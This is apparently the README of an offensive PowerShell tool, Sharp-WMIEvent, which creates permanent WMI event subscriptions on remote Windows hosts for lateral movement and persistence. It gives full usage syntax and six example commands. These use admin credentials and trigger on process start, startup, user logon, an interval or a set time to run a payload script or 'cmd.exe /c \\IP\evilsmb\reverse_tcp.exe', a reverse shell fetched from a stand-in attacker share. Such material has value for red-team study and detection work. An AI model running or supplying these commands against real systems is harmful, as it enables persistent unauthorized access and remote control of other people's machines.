# Sharp-WMIEvent

## Synopsis

The script realizes intranet lateral movement and permission persistence through WMI event subscription.

## Description

WMI provides a robust event system that can be used to respond to almost any event that occurs on the operating system. For example, when a process is created, a specific action can be performed by subscribing to WMI events. Among them, the specific conditions for triggering an event are called "Event Filter", such as user login, new process creation, etc.; the response to the occurrence of a specified event is called "Event Consumer", Including a series of specific operations, such as running scripts, recording logs, sending emails, etc. When deploying event subscriptions, you need to build Filter and Consumer separately and bind them together. For details, please refer to the relevant documents provided by Microsoft.

Hackers can use the capabilities of WMI to deploy permanent event subscriptions on remote hosts and execute arbitrary code or other actions when that event occurs. ActiveScriptEventConsumer and CommandLineEventConsumer in the event consumption class are mainly used. These two Event Consumers can execute any payload on a remote host in a fileless manner. This technique is mainly used to complete permissions persistence on the target system, and can also be used for lateral movement, and requires user credentials that provide administrator permissions on the remote host. For more details, please read the relevant articles in Link by yourself.

## Usage

```powershell
Sharp-WMIEvent [[-ComputerName] <String>] [[-Domain] <String>] [[-Username] <String>] [[-Password] <String>] [[-Fil
    terName] <String>] [[-ConsumerName] <String>] [[-Trigger] <String>] [[-ProcessName] <String>] [[-ScriptPath] <Strin
    g>] [[-Command] <String>] [[-IntervalPeriod] <Int32>] [[-ExecutionTime] <DateTime>] [<CommonParameters>]
```

## EXAMPLE

This command will create a permanent WMI event subscription on the target host specified by -ProcessName and run the script when the svchost.exe process starts.

```powershell
Sharp-WMIEvent -Trigger ProcessStart -ProcessName svchost.exe -ComputerName <IP/Hostname> -Domain <Domain Name> -Username <Username> -Password <Password> -ScriptPath "C:\Sharp-WMIEvent\payload.js" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

This command will create a permanent WMI event subscription on the target host specified by -ProcessName and execute the command when the svchost.exe process starts.

```powershell
Sharp-WMIEvent -Trigger ProcessStart -ProcessName svchost.exe -ComputerName <IP/Hostname> -Domain <Domain Name> -Username <Username> -Password <Password> -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

This command will create a permanent WMI event subscription and execute command within 5 minutes of system startup.

```powershell
Sharp-WMIEvent -Trigger Startup -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

This command will create a permanent WMI event subscription and execute the command when the user logs in.

```powershell
Sharp-WMIEvent -Trigger UserLogon -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

This command will create a permanent WMI event subscription and execute the command every 60 seconds.

```powershell
Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

This command will create a permanent WMI event subscription and execute the command at 08:00:00.

```powershell
Sharp-WMIEvent -Trigger Timed -ExecutionTime '08:00:00' -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

## Link

https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
